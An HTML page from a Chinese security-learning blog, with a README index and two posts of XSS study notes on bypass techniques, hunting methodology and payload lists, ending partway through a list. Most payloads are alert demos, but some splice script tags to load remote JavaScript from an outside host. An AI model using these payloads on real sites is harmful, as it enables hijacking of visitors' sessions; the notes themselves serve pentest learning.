<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/README/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/20/README/" itemprop="url">写在最前</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T19:40:17+08:00">
                2020-02-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  185 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><h3 id="本-README-md-为此博客目录索引"><a href="#本-README-md-为此博客目录索引" class="headerlink" title="本 README.md 为此博客目录索引"></a>本 <strong>README.md</strong> 为此博客目录索引</h3><ul>
<li>Github：<a href="https://github.com/Tomassky" target="_blank" rel="noopener">https://github.com/Tomassky</a></li>
<li>Gmail：<a href="mailto:tomassky7@gamil.com" target="_blank" rel="noopener">tomassky7@gamil.com</a></li>
</ul>
<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h2><ul>
<li><a href="https://tomassky.github.io/categories/Kali/" target="_blank" rel="noopener">Kali Linux笔记</a><ul>
<li><a href="https://www.aqniukt.com/course/83" target="_blank" rel="noopener">此笔记为安全牛苑房宏的Kali渗透测试课程</a></li>
</ul>
</li>
</ul>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul>
<li><a href="https://tomassky.github.io/categories/Git/" target="_blank" rel="noopener">Git笔记</a><ul>
<li><a href="https://www.youtube.com/playlist?list=PLK2w-tGRdrj5jO9Y1k2iAPCw7iSo6YVdx" target="_blank" rel="noopener">此笔记为Youtube代码真香的Git教程</a></li>
</ul>
</li>
</ul>
<h2 id="Penetration-tools"><a href="#Penetration-tools" class="headerlink" title="Penetration tools"></a>Penetration tools</h2><ul>
<li><a href="https://tomassky.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" target="_blank" rel="noopener">渗透工具</a> </li>
</ul>
<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><ul>
<li><a href="https://tomassky.github.io/categories/Operating-System/" target="_blank" rel="noopener">操作系统基础</a></li>
</ul>
<h2 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h2><ul>
<li><a href="https://tomassky.github.io/categories/IPS/" target="_blank" rel="noopener">IPS笔记</a><ul>
<li>此笔记为粤嵌袁盛智老师的IPS教程</li>
</ul>
</li>
</ul>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP笔记</a><ul>
<li>此笔记为B站黑马程序员的28天PHP零基础入门到精通教程（P1基础6天）</li>
<li>此笔记为传智播客的xindong的PHP基础教程</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP学习</a><ul>
<li>此学习笔记来自各个网站包括PHP官方，PHP中文网，脚本之家</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP实战</a><ul>
<li>此实战为应用所学，进行实践</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/" itemprop="url">XSS--手工挖掘方法论</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1. 编码绕过"></a>1. 编码绕过</h4><ul>
<li>URL编码<ul>
<li>URL只允许用US-ASCII字符集中可打印的字符(0×20—0x7x)</li>
<li>编码方式：字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)</li>
<li>+加号代表URL编码的空格，%20也是</li>
<li>&amp;-&gt; %26, # -&gt; %23</li>
</ul>
</li>
<li>Unicode编码<ul>
<li>javascript支持unicode、escapes、十六进制、八进制等编码形式</li>
<li>&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e，空格可以表示为\u0020</li>
</ul>
</li>
<li>html编码<ul>
<li>编码方式：&amp;#加十进制、十六进制ASCII码或unicode字符编码</li>
<li>浏览器解析的时候会先把html编码解析再进行渲染</li>
<li>▲ 编码必须在”值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染</li>
</ul>
</li>
<li>CSS编码<ul>
<li>编码方式：/斜杠加上1-6位十六进制</li>
<li>\ 反斜线，而css里，允许使用转义字符，+ascii16进制形式</li>
<li>▲ IE5之前都可以用expression来调用js时</li>
</ul>
</li>
</ul>
<h4 id="2-空格-回车-Tab"><a href="#2-空格-回车-Tab" class="headerlink" title="2. 空格/回车/Tab"></a>2. 空格/回车/Tab</h4><ul>
<li><code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></li>
<li>Javascript通常以分号结尾，如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号</li>
</ul>
<h4 id="3-改变大小写与重复标签"><a href="#3-改变大小写与重复标签" class="headerlink" title="3. 改变大小写与重复标签"></a>3. 改变大小写与重复标签</h4><ul>
<li><code>&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;</code></li>
<li><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
</ul>
<h4 id="4-宽字节绕过"><a href="#4-宽字节绕过" class="headerlink" title="4. 宽字节绕过"></a>4. 宽字节绕过</h4><ul>
<li>gbxxxx系列的编码 / 过滤：%22 -&gt; %5c%22（\ -&gt; 转义：\）</li>
<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0吃掉%5c</li>
</ul>
<h4 id="5-绕过magic-quotes-gpc"><a href="#5-绕过magic-quotes-gpc" class="headerlink" title="5. 绕过magic_quotes_gpc"></a>5. 绕过magic_quotes_gpc</h4><ul>
<li>magic_quotes_gpc=ON是php中的安全设置，开启后把一些特殊字符进行轮换，比如’(单引号)转换为&#39;，”(双引号)转换为&quot;，\转换为\</li>
<li>例如：<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;</code></li>
<li>针对开启了magic_quotes_gpc的网站，我们可以通过JavaScript中的String.formCharCode方法来绕过，我们可以把alert(“xss”);转换为(97,108,101,114,116,40,34,88,83,34,41,59)</li>
<li>▲ String.formCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串</li>
</ul>
<h4 id="6-解决限制字符（要求同页面）"><a href="#6-解决限制字符（要求同页面）" class="headerlink" title="6. 解决限制字符（要求同页面）"></a>6. 解决限制字符（要求同页面）</h4><ul>
<li>▲ 绕过限制字符长度<code>&lt;!--</code></li>
<li>分单元，最后通过eval()函数去拼接，详细过程可看云服务器的Bilibili的存储型XSS</li>
<li>script标签拼接<ul>
<li><code>&lt;script&gt;z=&#39;document.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;write(&quot;&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;&lt;script&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39; src=ht&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;tp://ww&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;w.shell&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;.net/1.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;js&gt;&lt;/sc&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;ript&gt;&quot;)&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;eval_r(z)&lt;/script&gt;</code></li>
</ul>
</li>
<li>svg标签拼接<ul>
<li><code>&lt;svg onload=a=&#39;document.writ&#39;&gt;</code></li>
<li><code>&lt;svg onload=b=&#39;e(String.from&#39;&gt;</code></li>
<li><code>&lt;svg onload=c=&#39;CharCode(60,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=d=&#39;15,99,114,105&#39;&gt;</code></li>
<li><code>&lt;svg onload=e=&#39;,112,116,32,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=f=&#39;15,114,99,61,&#39;&gt;</code></li>
<li><code>&lt;svg onload=g=&#39;39,104,116,11&#39;&gt;</code></li>
<li><code>&lt;svg onload=h=&#39;6,112,58,47,4&#39;&gt;</code></li>
<li><code>&lt;svg onload=i=&#39;7,116,46,99,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=j=&#39;10,47,82,52,8&#39;&gt;</code></li>
<li><code>&lt;svg onload=k=&#39;6,84,75,53,66&#39;&gt;</code></li>
<li><code>&lt;svg onload=l=&#39;,39,62,60,47,&#39;&gt;</code></li>
<li><code>&lt;svg onload=m=&#39;115,99,114,10&#39;&gt;</code></li>
<li><code>&lt;svg onload=n=&#39;5,112,116,62)&#39;&gt;</code></li>
<li><code>&lt;svg onload=o=&#39;);&#39;&gt;</code></li>
<li><code>&lt;svg onload=x=a+b+n+d+e+f+g+h&gt;</code></li>
<li><code>&lt;svg onload=t=i+j+k+l+m+n+o&gt;</code></li>
<li><code>&lt;svg onload=eval(x+t)&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="7-浏览器自带的协议"><a href="#7-浏览器自带的协议" class="headerlink" title="7. 浏览器自带的协议"></a>7. 浏览器自带的协议</h4><ul>
<li>通用协议：javascript:alert(1)</li>
<li>Chrome浏览器协议：data:alert(1)</li>
<li>IE浏览器协议：vbscript:alert(1)</li>
</ul>
<h4 id="8-Misc"><a href="#8-Misc" class="headerlink" title="8. Misc"></a>8. Misc</h4><ul>
<li>通过location.hash的方式，将参数写在#号后，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免了WAF的检测</li>
<li>script，/，’’等都被转换成&amp;nbsp，可以用换行符%0a，%0d来进行绕过</li>
<li>eval()函数来替换被过滤的alert()</li>
<li>// -&gt; 注释 -&gt; 换行输出 -&gt;结合&lt;- \ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
<li>优先级：function()函数 &gt; == &gt; &amp;</li>
<li>优先级：svg onload 会比 body onload 先执行</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98/" itemprop="url">XSS--手工挖掘</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-寻找思路"><a href="#1-寻找思路" class="headerlink" title="1. 寻找思路"></a>1. 寻找思路</h4><ul>
<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
<li>寻找思路差别<ul>
<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
</ul>
</li>
<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置（逆向思维）<ul>
<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
<li>接着开始测试输入，看输出的效果</li>
<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
</ul>
</li>
<li>⭐ 寻找反射型（正向思维）<ul>
<li>一个站点<a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></li>
<li>在目标站点上找到输入点</li>
<li>输入一组”特殊字符（单引号，双引号，尖括号等）+唯一识别字符（字母数字组合）”，点击提交后，查看返回的源码，是否有对应的处理</li>
<li>通过搜索定位到唯一识别字符，结合唯一识别字符的前后语法确认是否可以构造执行js的条件（是否能构造闭合）</li>
<li>提交构造的脚本代码（以及各种绕过姿势），看是否成功执行，如果成功执行说明存在xss漏洞</li>
</ul>
</li>
<li>⭐ 寻找DOM型（正向思维）<ul>
<li>查看代码是否有document.write、eval、window、document.URL.indexOf(“id=”)、cookie、referrer、#跳转、innerHTML之类能造成危害的地方</li>
<li>通过回溯变量和函数的调用过程，查看用户是否能控制输入</li>
<li>如果能控制输入，就看看是否能复习，能复习就说明存在DOM XSS</li>
</ul>
</li>
</ul>
<h4 id="2-常用的payload"><a href="#2-常用的payload" class="headerlink" title="2. 常用的payload"></a>2. 常用的payload</h4><ul>
<li>特殊字符：<code>&#39;&quot;&lt;&gt;666</code></li>
<li>弹窗：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>大小写：<code>&lt;sCrIpt&gt;alert(1)&lt;/ScrIpt&gt;</code></li>
<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
<li>重复script：<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
<li>HTML实体编码：<code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;</code>（一般用于反射型XSS，用于HTML代码）</li>
<li>Unicode编码：<code>\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e</code>（一般用于DOM型XSS，用于JS代码）</li>
<li>JavaScript字符串方法：<code>String.formCharCode(97,108,101,114,116,40,34,88,83,34,41,59)</code>（用于绕过magic_quotes_gpc，用来把ASCII转换为字符串）</li>
<li>onclick事件：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
<li>onload事件：<code>&lt;img src=x onload=alert(1)&gt;</code>（一般用于img的自动加载）</li>
<li>onerror事件：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>onmouse事件：<code>&lt;img src=x onmouse=alert(1)&gt;</code></li>
<li>href属性：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>src属性：<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>注释+伪协议：<code>javascrip&amp;#x74;:alert(1)//http://</code></li>
<li><code>&amp;Tab;</code>绕过：<code>javas&amp;Tab;cript:alert(1)</code></li>
<li>隐藏表单：<code>&quot; type=&quot;txt&quot; value=&quot;q&quot; onclick=&quot;alert(1)</code></li>
<li>/混淆形式：<code>&lt;img/src=@ onerror=alert(1)&gt;</code></li>
<li>绕过对src的限制：<code>&lt;img appendChild(createElement(&#39;script&#39;)).src=&#39;js_url&#39;&gt;</code></li>
<li>js代码eval(‘alert(1)’);voids来进入绕过对<code>&lt;&gt;</code>的过滤，此类常用于<code>&lt;script&gt;&lt;/script&gt;</code>标签之内</li>
<li>▲ payload中的重复，大小写等都适用于属性里面的内容，而不单单只属于标签</li>
<li>▲ 其他的一些，不外乎上面的payload+闭合标签，更多的payload已经上传到云服务器</li>
<li>▲ 更老的一些payload例子，可以查看XSS靶场–WooYun.tencent</li>
<li>⭐ 标签的闭合<ul>
<li>标签中间 -&gt; <code>&lt;/td&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>标签属性中间 -&gt;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>▲ 最好是闭合加载后的标签，留言后的标签也可以尝试</li>
<li>▲ 若标签限制了maxlength，可通过修改进行绕过，若修改不了长度或写入不了代码，可通过抓包写入代码或修改长度</li>
</ul>
</li>
<li>⭐ 闭合标签（⭐ 属性内）<ul>
<li><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><code>q&quot; onclick=&quot;alert(1)</code></li>
<li><code>javascrip&amp;#x74;:alert(1)//http://</code></li>
</ul>
</li>
</ul>
<h4 id="3-高级payload"><a href="#3-高级payload" class="headerlink" title="3. 高级payload"></a>3. 高级payload</h4><ul>
<li>⭐ 带XSS平台的payload尝试（XSS Hunter/xssye.com，云服务器都有保存）⭐</li>
<li>⭐ 别人总结的XSS备忘录，有很多的高质量的payload ⭐</li>
<li><code>&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;XSSURL&#39;;&gt;</code><ul>
<li>appendChild() 方法在指定元素节点的最后一个子节点之后添加节点</li>
</ul>
</li>
</ul>
<h4 id="4-关于DOM型代码审计时审计的特征点"><a href="#4-关于DOM型代码审计时审计的特征点" class="headerlink" title="4. 关于DOM型代码审计时审计的特征点"></a>4. 关于DOM型代码审计时审计的特征点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">▲ 关于更多的函数与代码，可以看MDN和RUNOOB的网站教程</span><br><span class="line"> //获取#锚点</span><br><span class="line"> var elements = location.hash;</span><br><span class="line"> //匹配参数</span><br><span class="line"> elements.indexOf</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> //获得id为&quot;Btn&quot;的元素</span><br><span class="line"> var oBtn=document.getElementById(&quot;Btn&quot;);</span><br><span class="line"> //设置或获取位于对象起始和结束标签内的HTML</span><br><span class="line"> oBtn.innerHTML</span><br><span class="line"> //设置或获取对象及其内容的HTML形式</span><br><span class="line"> oBtn.outerHTML</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> //添加一个元素</span><br><span class="line"> document.createElement</span><br><span class="line"> //创建或改变某个新属性</span><br><span class="line"> oBtn.setAttribute</span><br><span class="line"> //指定元素节点的最后一个子节点之后添加节点</span><br><span class="line"> oBtn.appendChild</span><br><span class="line"></span><br><span class="line"> //向文档写入HTML表达式或 JavaScript代码</span><br><span class="line"> document.write</span><br><span class="line"> //向文档写入HTML表达式或JavaScript代码外加可在每个表达式后写一个换行符</span><br><span class="line"> document.writeln</span><br><span class="line"> </span><br><span class="line"> //计算JavaScript字符串，并把它作为脚本代码来执行</span><br><span class="line"> eval(&quot;var x = &apos;&quot; + location.hash + &quot;&apos;&quot;);</span><br><span class="line"> //属于window的方法，该方法用于在指定的毫秒数后调用函数或计算表达式</span><br><span class="line"> setTimeout(&quot;alert(&apos;xss&apos;)&quot;, 1000)</span><br><span class="line"> //同上</span><br><span class="line"> window.setTimeout</span><br><span class="line"> document.setTimeout</span><br><span class="line"> //可按照指定的周期（以毫秒计）来调用函数或计算表达式，会不停地调用函数，直到clearInterval()被调用或窗口被关闭。由setInterval()返回的ID值可用作clearInterval()方法的参数，如果只想执行一次可以使用setTimeout()方法</span><br><span class="line"> window.setInterval</span><br><span class="line"> </span><br><span class="line"> //执行一个命令</span><br><span class="line"> document.execCommand(&apos;ForeColor&apos;,false,&apos;#BBDDCC&apos;);</span><br><span class="line"> //创建一个元素</span><br><span class="line"> document.createElement</span><br><span class="line"> //创建带有命名空间的元素节点</span><br><span class="line"> document.createElementNS</span><br><span class="line"> //创建一个事件</span><br><span class="line"> document.createEvent</span><br><span class="line"> document.createXxx</span><br></pre></td></tr></table></figure>

<ul>
<li>经验之谈<ul>
<li>一般查询接口容易出现反射性xss,留言板容易出现存储型xss</li>
